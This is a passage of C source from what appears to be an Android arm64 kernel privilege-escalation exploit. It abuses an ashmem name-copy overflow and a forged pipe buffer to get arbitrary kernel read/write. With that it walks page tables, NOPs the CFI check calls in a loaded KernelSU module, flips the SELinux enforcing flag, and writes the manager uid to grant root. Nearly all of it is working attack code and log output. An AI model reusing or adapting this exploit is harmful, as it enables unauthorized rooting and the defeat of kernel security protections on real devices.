	 * page table of the image/module 1GB slot (its pmd[img] must be a
	 * block/table descriptor and pmd[module] must be a pte table).
	 *
	 * Stub discovery is version-independent: read the module's exec region
	 * through its OWN mapping (configfs kread) and keep every BL whose
	 * decoded target == __cfi_slowpath + slide (kallsyms
	 * 0xFFFFFF8008384D98). No hardcoded ko offsets.
	 *
	 * Guards before ANY write: pmd/pte present + PA inside DRAM, alias read
	 * must equal the module-VA read byte-for-byte, BL opcode at the site. */
	{
		uint64_t mod_base = 0, head, entry, mm = 0, pgd = 0;
		uint64_t pgd_ent = 0, pmd_ent = 0, pte_ent = 0;
		uint64_t pa_pmd = 0, pa_pte = 0, pa_page = 0;
		uint64_t cfi_va = g_slide + 0xFFFFFF8008384D98ULL;
		uint64_t va39, scan_v, cur_page = 0, cur_alias = 0;
		uint32_t mod_size = 0;
		int idx0, idx2, idx3, walk_ok = 1, nstub = 0;
		int i, hops, nop_cnt = 0;
		static uint64_t stub[512];
		static uint8_t pg[4096];
		uint8_t big[16];
		ssize_t n;

		/* (0a) 38-r65: full pstore console dump BEFORE anything else —
		 * the previous boot's panic lives in the current ramoops until
		 * the next panic overwrites it. The filter reader above only
		 * greps keywords; this dumps the whole tail (last 300 lines)
		 * into the log for offline call-trace work. */
		{
			FILE *pf = fopen("/sys/fs/pstore/console-ramoops-0",
					 "r");

			if (!pf)
				pf = fopen("/sys/fs/pstore/console-ramoops",
					   "r");
			if (pf) {
				static char *lines[6000];
				int nl = 0, ln_cap = 6000, k;
				char ln[512];

				while (fgets(ln, sizeof(ln), pf) &&
				       nl < ln_cap) {
					lines[nl] = strdup(ln);
					if (lines[nl])
						nl++;
				}
				fclose(pf);
				for (k = (nl > 300 ? nl - 300 : 0); k < nl;
				     k++) {
					lines[k][strcspn(lines[k], "\n")] = 0;
					LOGI("[pstore-tail] %s",
					     lines[k]);
					free(lines[k]);
				}
			} else {
				LOGI("[pstore-tail] open FAIL errno=%d",
				     errno);
			}
		}

		/* (0) load the CFI ko NOW: the module init installs the hook into
		 * sys_call_table[167] immediately, and from that instant any
		 * prctl in the system would hit the cross-DSO slowpath and BUG.
		 * Keep the finit->NOP window as short as possible. */
		{
			/* 41-r119: root-chain-only state gate — root chain is
			 * done (cred patch + seccomp clear + enforcing write +
			 * consumer pinned) but the module is NEVER loaded.
			 * Isolates root-state effects from module residency:
			 * crash here => the root chain itself carries it;
			 * clean => it is in {finit, module residency}. */
			if (access("/data/local/tmp/t37-stop-before-finit",
				   F_OK) == 0) {
				LOGI("[physrw] P4.0a: STOP-FLAG "
				     "t37-stop-before-finit seen — root chain "
				     "done, module NOT loaded (root-only state)");
				goto restore;
			}

			int kfd = open("/data/local/tmp/kernelsu.ko", O_RDONLY);
			long fr = -1;

			if (kfd >= 0) {
				errno = 0;
				fr = syscall(273 /* finit_module */, kfd, "", 0);
				{
					int se = errno;

					LOGI("[physrw] P4: finit kernelsu.ko "
					     "ret=%ld errno=%d (%s)", fr, se,
					     errno_name(se));
					/* 38-r69: EEXIST = an earlier run on THIS
					 * boot already loaded the ko (hooks live,
					 * stubs NOPed). Continue — the walk/NOP
					 * path is idempotent. */
					if (fr != 0 && se == 17)
						fr = 0;
				}
				close(kfd);
			} else {
				LOGI("[physrw] P4: open kernelsu.ko FAIL errno=%d",
				     errno);
			}
			if (fr != 0) {
				LOGI("[physrw] P4: module not loaded — abort "
				     "(zero writes)");
				goto restore;
			}
			usleep(50 * 1000);

			/* 41-r123: side-load the offprobe calibrator (if present)
			 * via the same root context — pr_alert offsets land in
			 * dmesg; EIO load-failure is harmless. Runs BEFORE the
			 * state gates so every shape can calibrate. */
			{
				int ofd = open("/data/local/tmp/hello.ko",
					       O_RDONLY);

				if (ofd >= 0) {
					long or_ = syscall(273 /* finit_module */,
							   ofd, "", 0);

					LOGI("[physrw] P4: finit hello.ko "
					     "(offprobe?) ret=%ld errno=%d",
					     or_, errno);
					close(ofd);
				}
			}

			/* 41-r119: finit-only state gate — module loaded (F1
			 * takeover ran inside finit), then clean exit BEFORE
			 * the stub scan/NOP/crown. Smallest probe footprint
			 * that still carries a loaded module. */
			if (access("/data/local/tmp/t37-stop-after-finit",
				   F_OK) == 0) {
				/* 41-r119 enforcing A/B: r118 finit-only
				 * (enforcing=0) crashed 10/10; every crashing
				 * arm since r105 had enforcing=0 and every
				 * clean arm enforcing=1 — the one variable
				 * never A/B'd. K80U ghostlock RE-ENFORCES
				 * after module load (r115 report §1.4) and
				 * has no blob crash. With this flag, restore
				 * global enforcing=1 right after finit. */
				if (access("/data/local/tmp/t37-reenforce",
					   F_OK) == 0) {
					uint64_t se_addr = gl36_rt_slide +
						0xFFFFFF800AB47D90ULL;
					uint8_t one = 1;

					if (t37_kwrite_data(g_root_fd,
							    se_addr + 1,
							    &one, 1) == 1)
						LOGI("[physrw] P4.0c: "
						     "enforcing restored to 1 "
						     "(REENFORCE flag)");
					else
						LOGI("[physrw] P4.0c: "
						     "re-enforce write FAIL");
				}
				LOGI("[physrw] P4.0b: STOP-FLAG "
				     "t37-stop-after-finit seen — clean exit "
				     "before stub scan (finit-only state)");
				goto restore;
			}
		}

		/* (1) modules walk -> kernelsu core_layout.base */
		head = g_slide + 0xFFFFFF800A6E12D0ULL;
		entry = t37_kread64(fd, head);
		for (hops = 0; hops < 200 && entry && entry != head; hops++) {
			uint32_t st32 = 0xffffffffu;
			uint64_t nm;

			mm = entry - 8;
			if (t37_kread_data(fd, mm, &st32, 4) != 4) {
				mm = 0;
				break;
			}
			nm = t37_kread64(fd, mm + 0x18);
			if (nm == 0x75736C656E72656BULL && st32 <= 3)
				break;	/* name == "kernelsu", not UNFORMED */
			entry = t37_kread64(fd, entry);
			mm = 0;
		}
		if (mm && entry != head)
			mod_base = t37_kread64(fd, mm + 0x180);
		if ((mod_base >> 48) != 0xFFFF || (mod_base & 0xFFF)) {
			LOGI("[physrw] P4: modules walk miss / bad base %s",
			     u64hex(mod_base));
			goto restore;
		}
		{
			uint32_t tsz = 0;

			if (t37_kread_data(fd, mm + 0x188, &tsz, 4) != 4 ||
			    tsz < 0x2000 || tsz > 0x100000) {
				LOGI("[physrw] P4: core_layout.text_size %u "
				     "insane — abort", tsz);
				goto restore;
			}
			mod_size = tsz;
		}
		LOGI("[physrw] P4: kernelsu @%s base=%s size=0x%x cfi_slowpath=%s",
		     u64hex(mm), u64hex(mod_base), mod_size, u64hex(cfi_va));

		/* (2) swapper_pg_dir = init_mm.pgd (kernel TTBR1 half) */
		pgd = t37_kread64(fd, g_slide + 0xFFFFFF800A6F3FC0ULL + 0x48);
		if ((pgd >> 40) != 0xffffff || (pgd & 0xFFF)) {
			LOGI("[physrw] P4: init_mm.pgd %s malformed — abort",
			     u64hex(pgd));
			goto restore;
		}
		LOGI("[physrw] P4: swapper_pg_dir=%s", u64hex(pgd));

		/* (3) pgd entry of the module VA (39-bit VA, 3 levels) */
		va39 = mod_base & 0x7FFFFFFFFFULL;
		idx0 = (int)((va39 >> 30) & 0x1FF);
		idx2 = (int)((va39 >> 21) & 0x1FF);
		idx3 = (int)((va39 >> 12) & 0x1FF);
		pgd_ent = t37_kread64(fd, pgd + (uint64_t)idx0 * 8);
		LOGI("[physrw] P4: pgd[%d]=%s (pmd idx %d, pte idx %d)", idx0,
		     u64hex(pgd_ent), idx2, idx3);
		if ((pgd_ent & 3) != 3) {
			LOGI("[physrw] P4: pgd[%d] not a table — abort", idx0);
			goto restore;
		}
		pa_pmd = pgd_ent & 0xFFFFFFFFF000ULL;
		if (pa_pmd < 0x40000000ULL || pa_pmd >= 0x240000000ULL) {
			LOGI("[physrw] P4: pgd[%d] paddr=%s outside DRAM — abort",
			     idx0, u64hex(pa_pmd));
			goto restore;
		}

		/* (4) memstart calibration — ZERO probing reads (38-r64).
		 * r63 died reading the m=0 alias of an early-table PA (that
		 * alias is unmapped whenever m>=1: guessing aliases is exactly
		 * the "guess-address kread" pattern the discipline bans).
		 * Instead measure memstart directly: the probe is root
		 * (CAP_SYS_ADMIN acquired in the root chain), so
		 * /proc/self/pagemap gives the ABSOLUTE pfn of the mlocked
		 * marker page. P1/P2 already proved the forge index i maps
		 * linear VA PO + i*4096 exactly, so:
		 *   memstart = pa_marker - (g_page_base - PAGE_OFFSET).
		 * pa_marker must land inside the zoneinfo DRAM span
		 * [0x40000000, 0x240000000) or the walk is abandoned. */
		{
			int pmfd = open("/proc/self/pagemap", O_RDONLY);
			uint64_t ent = 0, vpn = (uint64_t)g_page_map >> 12;
			int got = 0;

			if (pmfd >= 0 &&
			    pread(pmfd, &ent, 8, (off_t)(vpn * 8)) == 8 &&
			    (ent & (1ULL << 63))) {
				uint64_t pa_marker = (ent & 0x7FFFFFFFFFULL) << 12;
				int64_t ms = (int64_t)pa_marker -
					     (int64_t)(g_page_base -
						       PRW_PAGE_OFFSET);

				LOGI("[physrw] P4: pagemap pa_marker=%llx "
				     "lin_off=%llx -> memstart=%llx",
				     (unsigned long long)pa_marker,
				     (unsigned long long)(g_page_base -
							  PRW_PAGE_OFFSET),
				     (unsigned long long)ms);
				if (ms >= -0x3DC0000000LL &&
				    ms <= 0x40000000LL &&
				    !(ms & 0x3FFFFFFFULL)) {
					g_prw_memstart = (uint64_t)ms;
					got = 1;
				}
			}
			if (pmfd >= 0)
				close(pmfd);
			if (!got) {
				LOGI("[physrw] P4: pagemap memstart calib "
				     "FAILED — abort (zero writes)");
				goto restore;
			}
		}

		/* (5) walk pmd/pte -> module page physical address */
		{
			uint64_t pmdp = PRW_PAGE_OFFSET +
					(pa_pmd - g_prw_memstart);

			pmd_ent = t37_kread64(fd, pmdp + (uint64_t)idx2 * 8);
			if ((pmd_ent & 3) == 1) {
				pa_page = ((pmd_ent & 0xFFFFFFFFF000ULL) +
					   (va39 & 0x1FFFFFULL)) & ~0xFFFULL;
			} else if ((pmd_ent & 3) == 3) {
				pa_pte = pmd_ent & 0xFFFFFFFFF000ULL;
				if (pa_pte < 0x40000000ULL ||
				    pa_pte >= 0x240000000ULL) {
					LOGI("[physrw] P4: pte table pa=%s "
					     "outside DRAM — abort", u64hex(pa_pte));
					walk_ok = 0;
				} else {
					uint64_t ptep = PRW_PAGE_OFFSET +
						(pa_pte - g_prw_memstart) +
						(uint64_t)idx3 * 8;

					pte_ent = t37_kread64(fd, ptep);
					if (!(pte_ent & 1)) {
						LOGI("[physrw] P4: pte=%s NP "
						     "— abort", u64hex(pte_ent));
						walk_ok = 0;
					} else {
						pa_page = pte_ent &
							  0xFFFFFFFFF000ULL;
					}
				}
			} else {
				LOGI("[physrw] P4: pmd[%d]=%s invalid — abort",
				     idx2, u64hex(pmd_ent));
				walk_ok = 0;
			}
		}
		if (walk_ok && (pa_page < 0x40000000ULL ||
				pa_page >= 0x240000000ULL)) {
			LOGI("[physrw] P4: module page pa=%s outside DRAM",
			     u64hex(pa_page));
			walk_ok = 0;
		}
		if (!walk_ok)
			goto restore;
		LOGI("[physrw] P4: pmd[%d]=%s pte=%s -> mod page pa=%s", idx2,
		     u64hex(pmd_ent), u64hex(pte_ent), u64hex(pa_page));

		/* (6) stub discovery over the exec region via the module's own
		 * mapping: every BL whose target == __cfi_slowpath + slide. */
		for (scan_v = mod_base; scan_v < mod_base + mod_size;
		     scan_v += 0x1000ULL) {
			int j;

			if (t37_kread_data(fd, scan_v, pg, 4096) != 4096)
				break;
			for (j = 0; j < 1024; j++) {
				uint32_t w;
				int64_t d;

				memcpy(&w, pg + j * 4, 4);
				if ((w & 0xFC000000u) != 0x94000000u)
					continue;
				d = ((int64_t)(w << 6)) >> 4;	/* imm26<<2 */
				if (scan_v + (uint64_t)j * 4 + (uint64_t)d ==
				    cfi_va && nstub < 512)
					stub[nstub++] = scan_v + (uint64_t)j * 4;
			}
		}
		LOGI("[physrw] P4: %d x bl __cfi_slowpath found in exec region",
		     nstub);
		if (nstub == 0) {
			/* 38-r69: an earlier run on THIS boot already NOPed every
			 * stub (BL gone → scan finds none). Idempotent: skip the
			 * NOP phase and go straight to the crown step. */
			LOGI("[physrw] P4: 0 BL stubs — module already de-CFI'd "
			     "by an earlier run; skipping NOP phase");
		}
		if (nstub > 0 && nstub < 5) {
			LOGI("[physrw] P4: too few stubs (%d) — abort (zero "
			     "writes)", nstub);
			goto restore;
		}

		/* 41-r115: pure-F1 state gate — F1 took the 7 wrapper sites at
		 * finit; with this flag the probe leaves the remaining check
		 * sites LIVE (no userland NOP, no flush) so the pure-F1 shape
		 * (7 dead + N live, un-ARMed, un-crowned) is observable. */
		if (access("/data/local/tmp/t37-skip-nop", F_OK) == 0) {
			LOGI("[physrw] P4.1b: SKIP-FLAG t37-skip-nop seen — "
			     "%d check sites left LIVE (pure-F1 state)", nstub);
			goto restore;
		}

		/* (7) per-stub: alias cross-check (alias == module VA read) then
		 * NOP via the linear alias (configfs kread of an unmapped/foreign
		 * page would already have Oopsed, so the walk is trusted; the
		 * byte-exact cross-check is the decisive guard). */
		for (i = 0; i < nstub; i++) {
			uint64_t v = stub[i], page = v & ~0xFFFULL;
			uint32_t w_va = 0, w_al = 0, nop = 0xD503201Fu;

			if (page != cur_page) {
				uint64_t p_i3 = (v >> 12) & 0x1FF;
				uint64_t p_pte = 0;

				/* re-walk only the pte for this page (same pmd) */
				pmd_ent = t37_kread64(fd, PRW_PAGE_OFFSET +
					(pa_pmd - g_prw_memstart) +
					(uint64_t)idx2 * 8);
				if ((pmd_ent & 3) == 1) {
					pa_page = ((pmd_ent & 0xFFFFFFFFF000ULL) +
						   ((v & 0x7FFFFFFFFFULL) &
						    0x1FFFFFULL)) & ~0xFFFULL;
				} else if ((pmd_ent & 3) == 3) {
					p_pte = t37_kread64(fd, PRW_PAGE_OFFSET +
						((pmd_ent & 0xFFFFFFFFF000ULL) -
						 g_prw_memstart) +
						p_i3 * 8);
					if (!(p_pte & 1)) {
						LOGI("[physrw] P4: pte NP @%s "
						     "— abort", u64hex(v));
						goto restore;
					}
					pa_page = p_pte & 0xFFFFFFFFF000ULL;
				} else {
					LOGI("[physrw] P4: pmd invalid — abort");
					goto restore;
				}
				if (pa_page < 0x40000000ULL ||
				    pa_page >= 0x240000000ULL) {
					LOGI("[physrw] P4: pa=%s outside DRAM "
					     "— abort", u64hex(pa_page));
					goto restore;
				}
				cur_page = page;
				cur_alias = PRW_PAGE_OFFSET +
					    (pa_page - g_prw_memstart);
				LOGI("[physrw] P4: page %s -> pa=%s alias=%s",
				     u64hex(page), u64hex(pa_page),
				     u64hex(cur_alias));
			}
			if (t37_kread_data(fd, v, &w_va, 4) != 4 ||
			    (w_va & 0xFC000000u) != 0x94000000u) {
				LOGI("[physrw] P4: stub %d @%s not BL (%08x) — "
				     "abort", i, u64hex(v), w_va);
				goto restore;
			}
			prw_fill_forge(forge40,
				       prw_virt_to_page(cur_alias),
				       (uint32_t)(v & 0xFFF), 5);
			if (t37_kwrite_data(fd, slot, forge40, PRW_BUF_SIZE) !=
			    (ssize_t)PRW_BUF_SIZE ||
			    t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) !=
			    (ssize_t)PRW_BUF_SIZE ||
			    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
				LOGI("[physrw] P4: forge FAIL stub %d", i);
				goto restore;
			}
			n = read(pfd[0], big, 4);
			if (n != 4) {
				LOGI("[physrw] P4: alias read n=%zd — abort", n);
				goto restore;
			}
			memcpy(&w_al, big, 4);
			if (w_al != w_va) {
				LOGI("[physrw] P4: ALIAS MISMATCH stub %d: "
				     "va=%08x alias=%08x — abort, ZERO WRITES",
				     i, w_va, w_al);
				goto restore;
			}
			if (i < 5)
				LOGI("[physrw] P4.1: stub %d @%s insn=%08x "
				     "BL+alias cross-check OK", i, u64hex(v),
				     w_va);
			/* NOP through the same alias (off = same page offset) */
			prw_fill_forge(forge40, prw_virt_to_page(cur_alias),
				       (uint32_t)(v & 0xFFF), 0);
			if (t37_kwrite_data(fd, slot, forge40, PRW_BUF_SIZE) !=
			    (ssize_t)PRW_BUF_SIZE ||
			    t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) !=
			    (ssize_t)PRW_BUF_SIZE ||
			    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
				LOGI("[physrw] P4: forge FAIL (nop) stub %d", i);
				goto restore;
			}
			if (write(pfd[1], &nop, 4) != 4) {
				LOGI("[physrw] P4: nop write FAIL stub %d", i);
				goto restore;
			}
			nop_cnt++;
		}
		LOGI("[physrw] P4.2: %d/%d stubs NOPed (linear alias)",
		     nop_cnt, nstub);

		/* (8) verify through the module's own mapping */
		{
			int bad = 0;

			for (i = 0; i < nstub; i++) {
				uint32_t v32 = 0;

				if (t37_kread_data(fd, stub[i], &v32, 4) != 4 ||
				    v32 != 0xD503201Fu)
					bad++;
			}
			LOGI("[physrw] P4.3: %d/%d stubs verified NOP via module "
			     "mapping %s", nstub - bad, nstub,
			     bad ? "(PARTIAL)" : "<<< MODULE DE-CFI'd");
			if (bad)
				goto restore;
		}

		/* (8a-b) 41-r112 three-state decouple: (b) state gate — CFI
		 * stubs NOPed but NOT armed/crowned. The stop-flag file routes
		 * through the verified clean restore path (same exit as the
		 * bad-verify branch above); module + 5 hooks stay resident
		 * (no rmmod path by design). Create
		 * /data/local/tmp/t37-stop-after-nop to select this state. */
		if (access("/data/local/tmp/t37-stop-after-nop", F_OK) == 0) {
			LOGI("[physrw] P4.3b: STOP-FLAG t37-stop-after-nop seen "
			     "— clean exit before ARM/crown (state (b))");
			goto restore;
		}

		/* (8b) 38-r76: arm the supercall hooks. Deliberately HERE and
		 * not at module_init: the reboot/setresuid hooks must not be
		 * live while CFI stubs are still un-NOPed (that window is what
		 * panicked boots AG/AH). By this point every stub is verified
		 * NOPed. Idempotent on the kernel side. */
		{
			uint32_t res = 0;
			long pr = syscall(SYS_prctl, 0xDEADBEEFULL, 14ULL,
					  0ULL, 0ULL, &res);

			LOGI("[physrw] P5: supercall arm ret=%ld result=%08x %s",
			     pr, res, (res == 0xDEADBEEF) ? "<<< ARMED" :
			     "(NOT armed)");
		}

		/* (8b-b2) 41-r112: (b2) state gate — armed but NOT crowned.
		 * Separates "ARM 后新增 reboot/setresuid 表项" from "加冕写"
		 * in the decouple matrix. Create
		 * /data/local/tmp/t37-stop-after-arm to select this state. */
		if (access("/data/local/tmp/t37-stop-after-arm", F_OK) == 0) {
			LOGI("[physrw] P5b: STOP-FLAG t37-stop-after-arm seen "
			     "— clean exit before crown (state (b2))");
			goto restore;
		}

		/* (9) litmus */
		{
			uint32_t kv = 0;
			long pr = syscall(SYS_prctl, 0xDEADBEEFULL, 2ULL, &kv,
					  0ULL, 0ULL);

			LOGI("[physrw] P4.4 litmus: ret=%ld version=%u %s", pr, kv,
			     (kv > 0) ?
			     "<<< ABI LITMUS PASS — KERNELSU LIVE" :
			     "(non-green: pstore forensics next boot)");
		}

		/* (10) 38-r68 P4.5 CROWN MANAGER: v0.9.5 driver binds the manager
		 * only via throne-tracker (rename hook, absent in this table-hook
		 * build) or the uid%100000==manager_uid auto-bind (needs a valid
		 * uid already). Dead ends both — write ksu_manager_uid DIRECTLY
		 * (u32 @ module .data+0x30 per ko symbol table) = 10239 (uid of
		 * me.weishu.kernelsu on this install). Readback-closed; the
		 * pre-value must be 0xffffffff (KSU_INVALID_UID) or already
		 * 10239 (idempotent re-run). */
		{
			/* 38-r75: the .data runtime offset is BUILD-DEPENDENT and
			 * cannot be hand-computed — it shifts whenever .text or
			 * .rodata grow, and arm64's module loader also expands the
			 * placeholder .plt into (n_plts+1)*16 bytes at load time,
			 * which no ELF-level arithmetic reproduces. The old
			 * hardcoded 0xf318 was correct for the pre-supercall ko and
			 * silently wrong afterwards (it would have hit the "cur !=
			 * INVALID" guard and aborted, not corrupted anything).
			 *
			 * Locate ksu_manager_uid by signature instead. At boot .data
			 * holds exactly: allowlist_mutex (0x00..0x1f, zero-init),
			 * apk_path_hash_list (0x20..0x2f, zero-init), then
			 * ksu_manager_uid (u32) at +0x30 and root_groups at +0x34.
			 * So the uid is preceded by exactly 0x30 zero bytes, and its
			 * value is 0xffffffff (KSU_INVALID_UID) or already 10239.
			 * The scan stays inside the module's own mapped image, so
			 * every read is of a mapped page (kread of an unmapped
			 * address would be an Oops). */
			uint64_t mu = 0;
			uint64_t scan_off;
			int n_cand = 0;

			for (scan_off = 0x8000;
			     scan_off + 12 <= (uint64_t)mod_size; scan_off += 4) {
				uint32_t v = 0, usage = 0, ngroups = 0;

				if (t37_kread_data(fd, mod_base + scan_off,
						   &v, 4) != 4)
					continue;
				if (v != 0xffffffffu && v != 10239u)
					continue;
				/* Discriminator: .data ends with
				 *   +0x30 ksu_manager_uid (u32)
				 *   +0x34 root_groups = struct group_info {
				 *             atomic_t usage; int ngroups; }
				 * At boot usage=2 / ngroups=0; usage only
				 * grows via get_group_info(). A run of
				 * 0xffffffff bytes (uninitialised padding,
				 * and there is one right here in this image)
				 * fails this because its +4/+8 are also
				 * 0xffffffff. The old "0x30 zero bytes
				 * before" test was WRONG: allowlist_mutex
				 * sits there and mutex_init() dirties it at
				 * runtime, so that test rejected the real
				 * target. */
				if (t37_kread_data(fd, mod_base + scan_off + 4,
						   &usage, 4) != 4)
					continue;
				if (t37_kread_data(fd, mod_base + scan_off + 8,
						   &ngroups, 4) != 4)
					continue;
				if (usage < 1 || usage > 4096 || ngroups != 0)
					continue;

				LOGI("[physrw] P4.5: candidate #%d @%s "
				     "(off %s) usage=%u ngroups=%u", n_cand,
				     u64hex(mod_base + scan_off),
				     u64hex(scan_off), usage, ngroups);
				if (!mu)
					mu = mod_base + scan_off;
				if (++n_cand >= 8)
					break;
			}
			if (!mu) {
				LOGI("[physrw] P4.5: ksu_manager_uid signature "
				     "not found in [0x8000,%s) — ABORT "
				     "(zero writes)", u64hex(mod_size));
				goto restore;
			}
			LOGI("[physrw] P4.5: ksu_manager_uid located by scan @%s "
			     "(image off %s)", u64hex(mu), u64hex(mu - mod_base));
			{
			uint32_t cur = 0, want = 10239, w_al = 0;
			uint64_t mu_page = mu & ~0xFFFULL;

			if (t37_kread_data(fd, mu, &cur, 4) == 4)
				LOGI("[physrw] P4.5: ksu_manager_uid @%s cur=%u",
				     u64hex(mu), cur);
			if (cur == want) {
				LOGI("[physrw] P4.5: already crowned — skip write");
				goto crown_done;
			}
			if (cur != 0xffffffffu) {
				LOGI("[physrw] P4.5: cur != INVALID — layout "
				     "drift suspect, ABORT (zero writes)");
				goto restore;
			}
			/* walk the pte for this exact page (same pmd) */
			if ((pmd_ent & 3) != 3) {
				LOGI("[physrw] P4.5: pmd not a table — abort");
				goto restore;
			}
			{
				uint64_t p_i3 = (mu >> 12) & 0x1FF;
				uint64_t p_pte = t37_kread64(fd,
					PRW_PAGE_OFFSET +
					((pmd_ent & 0xFFFFFFFFF000ULL) -
					 g_prw_memstart) +
					p_i3 * 8);
				uint64_t pa_mud = 0, alias_mud = 0;

				if (!(p_pte & 1)) {
					LOGI("[physrw] P4.5: pte NP for "
					     "manager_uid page — abort");
					goto restore;
				}
				pa_mud = p_pte & 0xFFFFFFFFF000ULL;
				if (pa_mud < 0x40000000ULL ||
				    pa_mud >= 0x240000000ULL) {
					LOGI("[physrw] P4.5: pa=%s outside "
					     "DRAM — abort", u64hex(pa_mud));
					goto restore;
				}
				alias_mud = PRW_PAGE_OFFSET +
					    (pa_mud - g_prw_memstart);
				LOGI("[physrw] P4.5: .data page %s -> pa=%s "
				     "alias=%s", u64hex(mu_page),
				     u64hex(pa_mud), u64hex(alias_mud));

				/* alias cross-check: 4B @mu must read 0xffffffff
				 * through BOTH channels before writing */
				prw_fill_forge(forge40,
					       prw_virt_to_page(alias_mud),
					       (uint32_t)(mu & 0xFFF), 5);
				if (t37_kwrite_data(fd, slot, forge40,
						    PRW_BUF_SIZE) !=
				    (ssize_t)PRW_BUF_SIZE ||
				    t37_kread_data(fd, slot, rb40,
						   PRW_BUF_SIZE) !=
				    (ssize_t)PRW_BUF_SIZE ||
				    memcmp(rb40, forge40, PRW_BUF_SIZE) != 0) {
					LOGI("[physrw] P4.5: forge FAIL");
					goto restore;
				}
				{
					ssize_t rn = read(pfd[0], big, 4);

					if (rn != 4) {
						LOGI("[physrw] P4.5: alias "
						     "read n=%zd — abort", rn);
						goto restore;
					}
					memcpy(&w_al, big, 4);
				}
				if (w_al != 0xffffffffu) {
					LOGI("[physrw] P4.5: ALIAS MISMATCH "
					     "cur=%08x — abort, ZERO WRITES",
					     w_al);
					goto restore;
				}
				/* NOP-write path reuse: forge with len=0 then
				 * write the u32 through the pipe channel */
				{
					uint32_t v32 = want;

					prw_fill_forge(forge40,
						       prw_virt_to_page(
							       alias_mud),
						       (uint32_t)(mu & 0xFFF),
						       0);
					if (t37_kwrite_data(fd, slot, forge40,
							    PRW_BUF_SIZE) !=
					    (ssize_t)PRW_BUF_SIZE ||
					    t37_kread_data(fd, slot, rb40,
							   PRW_BUF_SIZE) !=
					    (ssize_t)PRW_BUF_SIZE ||
					    memcmp(rb40, forge40,
						   PRW_BUF_SIZE) != 0) {
						LOGI("[physrw] P4.5: forge "
						     "FAIL (write)");
						goto restore;
					}
					if (write(pfd[1], &v32, 4) != 4) {
						LOGI("[physrw] P4.5: write "
						     "FAIL");
						goto restore;
					}
				}
			}
crown_done:
			/* verify via the module's own mapping + litmus */
			{
				uint32_t v32 = 0;
				long pr;
				uint32_t kv = 0;

				if (t37_kread_data(fd, mu, &v32, 4) == 4 &&
				    v32 == 10239)
					LOGI("[physrw] P4.5: ksu_manager_uid "
					     "== 10239 VERIFIED via module "
					     "mapping <<< MANAGER CROWNED");
				else
					LOGI("[physrw] P4.5: verify FAIL "
					     "(%u) — see lines above", v32);
				/* BECOME_MANAGER from uid0 (this process was
				 * rooted) only replies if from_manager; the
				 * REAL proof = manager app now shows 工作 */
				pr = syscall(SYS_prctl, 0xDEADBEEFULL, 2ULL,
					     &kv, 0ULL, 0ULL);
				LOGI("[physrw] P4.5: post-crown GET_VERSION "
				     "ret=%ld ver=%u", pr, kv);
			}
		}
	}
		}

	LOGI("[physrw] P0-P3 ALL GREEN — steady-state arbitrary read/write "
	     "over the linear map is LIVE (zero-plant per op from here on)");

restore:
	/* unconditional restore: saved40 back over the slot (design §6.2/§4.3-5) */
	if (t37_kwrite_data(fd, slot, saved40, PRW_BUF_SIZE) ==
	    (ssize_t)PRW_BUF_SIZE) {
		if (t37_kread_data(fd, slot, rb40, PRW_BUF_SIZE) ==
		    (ssize_t)PRW_BUF_SIZE &&
		    memcmp(rb40, saved40, PRW_BUF_SIZE) == 0)
			LOGI("[physrw] restore VERIFIED (slot == saved40) — "
			     "pipe back to normal 1-byte state");
		else
			LOGI("[physrw] restore readback MISMATCH — pipe fd "
			     "LEFT OPEN, do not close (R9 policy)");
	} else {
		LOGI("[physrw] restore kwrite FAIL — pipe fd LEFT OPEN "
		     "(R9 policy: prefer not closing over corrupt teardown)");
	}
close_pipe:
	/* close only when the slot was proven restored; otherwise leak fds on
	 * purpose (process is a throwaway probe) */
	if (memcmp(rb40, saved40, PRW_BUF_SIZE) == 0) {
		close(pfd[0]);
		close(pfd[1]);
		LOGI("[physrw] pipe fds closed after verified restore");
	} else {
		LOGI("[physrw] pipe fds NOT closed (restore unverified) — "
		     "process exit will drop them; slot was %s",
		     memcmp(rb40, saved40, PRW_BUF_SIZE) == 0 ? "clean" :
		     "possibly forged");
	}
}

/* aresin util.c:526-560 — SET_NAME plants bytes via strcpy(asma->name+11):
 * user string byte u lands at asma[0x0B+u]; the first NUL in the user string
 * ends the copy. 38-r34: every VALUE byte is encoded zero-free (tail-offset
 * compensation below), so a page-only plant is a SINGLE SET_NAME; only the
 * 13 structural-zero bytes (mutex.owner + needs_read_fill + read_in_progress,
 * see the r34 consumption table) still need the tombstone dance. Zeros:
 * first write replaces them with 1, then each zero position is re-written
 * (zero-terminated) from back to front so later short writes never destroy
 * earlier tails. */
static int t37_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len)
{
	char name[257];
	size_t i;

	memset(name, 0x41, sizeof(name));
	for (i = 0; i < len; i++)
		name[i] = blob[i] ? blob[i] : 1;
	name[len] = 0;
	return ioctl(fd, GL36_ASHMEM_SET_NAME, name);
}

static int t37_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos)
{
	char name[257];
	size_t i;

	memset(name, 0x41, sizeof(name));
	for (i = 0; i < pos; i++)
		name[i] = blob[i] ? blob[i] : 1;
	name[pos] = 0;
	return ioctl(fd, GL36_ASHMEM_SET_NAME, name);
}

static int t37_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len)
{
	size_t i;

	if (t37_put_blob_no_zeros(fd, blob, len) != 0)
		return -1;
	for (i = len; i > 0; i--) {
		if (blob[i - 1] == 0 &&
		    t37_put_blob_zero_at(fd, blob, i - 1) != 0)
			return -1;
	}
	/* 38-r38 fix B (research/38-setname-offset-attribution.md §5): the
	 * zero-free r34 encoding made blob[0] = 0x41, so name[11] never ends
	 * as 0 — get_name (ashmem.c:583) then takes the strlen branch and
	 * returns the blob string instead of the "dev/ashmem\0" constant,
	 * which the r22 roundtrip verifier misread as a landing failure
	 * (r36/r37 'AAAAA' 12-连败 was the verifier killing healthy plants,
	 * NOT a broken channel). Unconditional pos-0 tombstone: the user
	 * string is a single NUL => strcpy(name+11, "") writes ONLY
	 * name[11] = 0 — cfg 0x0B is the pos field, never consumed. This
	 * restores the r22 GET_NAME observation exactly. */
	return t37_put_blob_zero_at(fd, blob, 0);
}

/* ============================================================================
 * 38-r34: zero-free plant encoding — value plants carry no NUL byte
 * ============================================================================
 *
 * BLOCKER (38, KE19/20/21): the r33 plant blob was memset(0) + 3 field
 * values, T37_BLOB_LEN = 0x4D = 77 bytes over cfg 0x0B..0x57. ~55 of those
